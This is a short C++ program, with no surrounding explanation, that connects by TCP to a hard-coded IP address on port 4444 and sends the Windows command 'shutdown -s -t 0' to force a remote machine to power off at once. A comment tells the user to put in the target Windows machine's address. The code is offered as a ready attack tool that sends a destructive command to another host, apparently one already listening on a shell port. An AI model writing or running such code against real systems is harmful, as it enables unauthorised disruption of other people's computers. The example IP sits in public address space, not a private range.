#include <iostream>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

using namespace std;

int main() {
    // Target IP and port
    const char* target_ip = "192.165.1.100"; // Replace with the Windows machine's IP
    int target_port = 4444;

    // Create socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        cerr << "Error: Could not create socket." << endl;
        return 1;
    }

    // Set up the server address
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    // Connect to the target
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        cerr << "Error: Could not connect to target." << endl;
        close(sockfd);
        return 1;
    }

    // Send shutdown command
    const char* shutdown_cmd = "shutdown -s -t 0\n";
    send(sockfd, shutdown_cmd, strlen(shutdown_cmd), 0);

    cout << "Sent shutdown command to Windows machine at " << target_ip << endl;

    // Close the socket
    close(sockfd);

    return 0;
}
